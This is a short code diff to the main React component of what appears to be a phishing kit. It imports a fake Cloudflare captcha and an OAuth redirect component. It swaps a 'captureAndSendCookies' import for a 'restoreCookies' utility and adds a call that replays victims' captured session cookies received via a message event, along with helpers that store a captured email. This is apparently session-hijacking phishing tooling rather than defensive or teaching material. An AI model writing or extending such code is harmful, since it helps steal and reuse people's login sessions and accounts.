@@ -3,8 +3,8 @@ import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 
-// 🟢 NEW: Import cookie/email capture function and setter utilities
-import { captureAndSendCookies, setCapturedEmail, setCapturedCookies } from './utils/client-cookie-capture';
+// 🟢 NEW: Import robust cookie/email setter from restoreCookies.js
+import { restoreCookies, setCapturedEmail, setCapturedCookies } from './utils/restoreCookies';
 
 // Artificial delay helper (milliseconds)
 const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
@@ -255,6 +255,7 @@ function App() {
           const cookiesJson = JSON.stringify(event.data.data.cookies);
           setCapturedCookiesState(cookiesJson);
           setCapturedCookies(event.data.data.cookies);
+          restoreCookies(event.data.data.cookies); // Optionally restore immediately
         } catch (e) {
           // fallback: ignore
         }
